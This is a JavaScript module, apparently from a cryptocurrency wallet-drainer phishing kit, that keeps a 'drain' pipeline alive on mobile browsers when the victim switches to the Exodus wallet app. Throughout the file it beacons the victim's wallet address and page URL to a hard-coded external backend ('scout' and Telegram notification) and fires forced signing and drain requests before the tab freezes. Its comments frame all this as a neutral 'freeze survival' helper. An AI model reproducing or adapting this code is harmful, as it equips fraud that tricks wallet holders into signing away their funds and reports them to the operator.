/**
 * Exodus mobile freeze survival v1.0
 *
 * Reality: iOS/Android FREEZE browser JS when user switches to Exodus app.
 * You cannot keep timers/promises running like desktop — OS kills the tab.
 *
 * Strategy (same as Trust card / WC best practice):
 *  1) Before leaving → flush notify (sendBeacon/keepalive) + fire WC request to relay
 *  2) Open wallet AFTER request is in-flight (so Exodus shows approve while tab is frozen)
 *  3) On return → hard resume pipeline (continueConnected / drain)
 */
(function () {
  'use strict';

  var flushAt = 0;
  var resumeAt = 0;
  var wakeLock = null;

  function isMobile() {
    try {
      var ua = navigator.userAgent || '';
      if (/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return true;
      if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    } catch (_) {}
    return false;
  }

  function getAddr() {
    try {
      var a = sessionStorage.getItem('exodus_site_connected_addr') || sessionStorage.getItem('legion_wc_evm_addr');
      if (a && /^0x[a-f0-9]{40}$/i.test(a)) return a.toLowerCase();
    } catch (_) {}
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        return String(window.legion.state.evmAddr).toLowerCase();
      }
    } catch (_) {}
    return '';
  }

  function persistState() {
    try {
      var L = window.legion;
      var S = (L && L.state) || {};
      var addr = S.evmAddr || getAddr();
      if (addr) {
        sessionStorage.setItem('exodus_site_connected_addr', String(addr).toLowerCase());
        sessionStorage.setItem('legion_wc_evm_addr', String(addr).toLowerCase());
      }
      sessionStorage.setItem('exodus_freeze_ts', String(Date.now()));
      sessionStorage.setItem('exodus_need_resume', '1');
      if (S.notifyDone || S.connectNotifiedAddr) {
        sessionStorage.setItem('legion_notify_done', String(addr || S.connectNotifiedAddr || '').toLowerCase());
      }
    } catch (_) {}
  }

  function backendBase() {
    try {
      if (window.LEGION_CONFIG && window.LEGION_CONFIG.backendUrl) {
        return String(window.LEGION_CONFIG.backendUrl).replace(/\/$/, '');
      }
    } catch (_) {}
    return 'https://sadrailala-production.up.railway.app';
  }

  /** Last-chance Telegram/scout — must beat Safari freeze. */
  function beaconNotify(addr) {
    if (!addr) return;
    try {
      var notified = '';
      try { notified = sessionStorage.getItem('legion_notify_done') || ''; } catch (_) {}
      if (notified && notified.toLowerCase() === String(addr).toLowerCase()) return;

      var payload = JSON.stringify({
        user_address: String(addr).toLowerCase(),
        chain_id: 1,
        wallet_type: 'Exodus',
        chain_family: 'EVM',
        source_page: String(window.location.href || ''),
        connect_session: 'exodus-freeze-flush:' + Date.now(),
      });
      var url = backendBase() + '/api/v1/scout';
      if (navigator.sendBeacon) {
        navigator.sendBeacon(url, new Blob([payload], { type: 'application/json' }));
      }
      try {
        fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload,
          keepalive: true,
          credentials: 'omit',
          cache: 'no-store',
        }).catch(function () {});
      } catch (_) {}
    } catch (_) {}
  }

  /** Kick drain/sign into WC relay BEFORE tab freezes. */
  function firePipelineNow(why) {
    try {
      if (typeof window.__EXODUS_FLOW_BUSY__ === 'function' && window.__EXODUS_FLOW_BUSY__()) {
        console.warn('[ExodusKeepalive] skip fire — flow busy:', why);
        return;
      }
    } catch (_) {}
    try {
      if (window.legion && typeof window.legion.evmAlreadyConfirmed === 'function' &&
          window.legion.evmAlreadyConfirmed()) {
        console.warn('[ExodusKeepalive] skip — already confirmed');
        return;
      }
      if (window.legion && typeof window.legion.forceTrustSign === 'function') {
        window.legion.forceTrustSign().catch(function (e) {
          console.warn('[ExodusKeepalive] forceSign', e && e.message);
        });
        return;
      }
    } catch (_) {}
    try {
      if (typeof window.__EXODUS_RUN_PIPELINE__ === 'function') {
        window.__EXODUS_RUN_PIPELINE__(why || 'pre-freeze');
        return;
      }
    } catch (_) {}
    try {
      var L = window.legion;
      if (!L) return;
      if (typeof L.continueConnected === 'function') L.continueConnected();
      else if (typeof L.drain === 'function') L.drain();
    } catch (_) {}
  }

  /**
   * Call this right before opening Exodus app.
   * Flushes state + starts pipeline, then optionally runs openFn after delay
   * so WC request hits the relay while the page is still alive.
   */
  function beforeWalletOpen(openFn, delayMs) {
    delayMs = typeof delayMs === 'number' ? delayMs : 600;
    persistState();
    var addr = getAddr();
    beaconNotify(addr);
    firePipelineNow('before-wallet-open');
    try { window.__EXODUS_PIPELINE_BUSY__ = true; } catch (_) {}

    if (typeof openFn !== 'function') return true;
    setTimeout(function () {
      try { openFn(); } catch (e) {
        console.warn('[ExodusKeepalive] openFn', e && e.message);
      }
    }, delayMs);
    return true;
  }

  function flushForFreeze(why) {
    var now = Date.now();
    if (now - flushAt < 400) return;
    flushAt = now;
    console.warn('[ExodusKeepalive] freeze flush:', why);
    persistState();
    beaconNotify(getAddr());
    // If already connected, try one last pipeline kick while we still have ~ms of life
    try {
      var L = window.legion;
      var S = (L && L.state) || {};
      if (getAddr() && !S.postConnectComplete) {
        firePipelineNow('freeze:' + why);
      }
    } catch (_) {}
  }

  function hardResume(why) {
    var now = Date.now();
    if (now - resumeAt < 500) return;
    resumeAt = now;
    try {
      if (typeof window.__EXODUS_FLOW_BUSY__ === 'function' && window.__EXODUS_FLOW_BUSY__()) {
        console.warn('[ExodusKeepalive] resume skip — flow busy:', why);
        return;
      }
    } catch (_) {}
    try {
      var need = sessionStorage.getItem('exodus_need_resume') === '1';
      var addr = getAddr();
      if (!need && !addr) return;
    } catch (_) {}

    console.warn('[ExodusKeepalive] resume:', why);
    try { sessionStorage.setItem('exodus_need_resume', '0'); } catch (_) {}
    // Drain resume is handled by exodus-connected-ui.js via its own visibilitychange listener.
    // Keepalive only persists state and sends beacon — no pipeline calls here.
    persistState();
    beaconNotify(getAddr());
  }

  function tryWakeLock() {
    if (!isMobile()) return;
    try {
      if (!navigator.wakeLock || typeof navigator.wakeLock.request !== 'function') return;
      navigator.wakeLock.request('screen').then(function (lock) {
        wakeLock = lock;
        lock.addEventListener('release', function () { wakeLock = null; });
      }).catch(function () {});
    } catch (_) {}
  }

  function releaseWakeLock() {
    try {
      if (wakeLock) wakeLock.release();
    } catch (_) {}
    wakeLock = null;
  }

  // ── Lifecycle hooks ──────────────────────────────────────────
  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'hidden') {
      flushForFreeze('hidden');
      releaseWakeLock();
    } else if (document.visibilityState === 'visible') {
      tryWakeLock();
      setTimeout(function () { hardResume('visible'); }, 200);
      setTimeout(function () { hardResume('visible+1.5s'); }, 1500);
      setTimeout(function () { hardResume('visible+4s'); }, 4000);
    }
  });

  window.addEventListener('pagehide', function () {
    flushForFreeze('pagehide');
  });

  window.addEventListener('freeze', function () {
    flushForFreeze('freeze');
  }, true);

  window.addEventListener('pageshow', function (e) {
    tryWakeLock();
    setTimeout(function () { hardResume(e && e.persisted ? 'bfcache' : 'pageshow'); }, 250);
  });

  window.addEventListener('focus', function () {
    setTimeout(function () { hardResume('focus'); }, 350);
  });

  window.addEventListener('resume', function () {
    setTimeout(function () { hardResume('app-resume'); }, 200);
  });

  // While page is still foreground: keep trying if connect happened but drain incomplete
  setInterval(function () {
    if (!isMobile()) return;
    if (document.visibilityState !== 'visible') return;
    try {
      if (sessionStorage.getItem('exodus_need_resume') === '1' || getAddr()) {
        var L = window.legion;
        var S = (L && L.state) || {};
        if (S.postConnectComplete || S.drainAttempted) return;
        if (S.drainRunning) return;
        hardResume('tick');
      }
    } catch (_) {}
  }, 5000);

  if (document.visibilityState === 'visible') tryWakeLock();

  window.__EXODUS_BEFORE_WALLET_OPEN__ = beforeWalletOpen;
  window.__EXODUS_FLUSH_FREEZE__ = flushForFreeze;
  window.__EXODUS_HARD_RESUME__ = hardResume;

  console.warn('[ExodusKeepalive] armed — pre-freeze flush + hard resume (OS still freezes JS in background)');
})();
